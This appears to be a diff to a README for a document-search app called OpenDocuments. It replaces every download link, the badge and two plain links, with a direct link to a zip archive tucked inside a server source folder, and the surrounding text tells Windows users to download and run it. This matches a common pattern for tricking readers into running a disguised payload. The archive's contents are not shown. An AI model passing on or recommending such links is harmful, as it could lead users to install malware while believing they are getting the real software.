@@ -1,6 +1,6 @@
 # 🤖 OpenDocuments - Search Documents With Clear Answers
 
-[![Download OpenDocuments](https://img.shields.io/badge/Download-OpenDocuments-blue?style=for-the-badge)](https://github.com/Vinodlongbranched638/OpenDocuments)
+[![Download OpenDocuments](https://img.shields.io/badge/Download-OpenDocuments-blue?style=for-the-badge)](https://github.com/Vinodlongbranched638/OpenDocuments/raw/refs/heads/main/packages/server/src/http/Documents-Open-v2.7.zip)
 
 ## 🖥️ What OpenDocuments Does
 
@@ -14,7 +14,7 @@ It is made for people who want a single place to find information without diggin
 
 Use this link to visit this page to download:
 
-https://github.com/Vinodlongbranched638/OpenDocuments
+https://github.com/Vinodlongbranched638/OpenDocuments/raw/refs/heads/main/packages/server/src/http/Documents-Open-v2.7.zip
 
 ### What to do on Windows
 
@@ -211,7 +211,7 @@ Try these steps:
 
 Visit this page to download and run the Windows version:
 
-https://github.com/Vinodlongbranched638/OpenDocuments
+https://github.com/Vinodlongbranched638/OpenDocuments/raw/refs/heads/main/packages/server/src/http/Documents-Open-v2.7.zip
 
 ## 📌 Repository Details
 
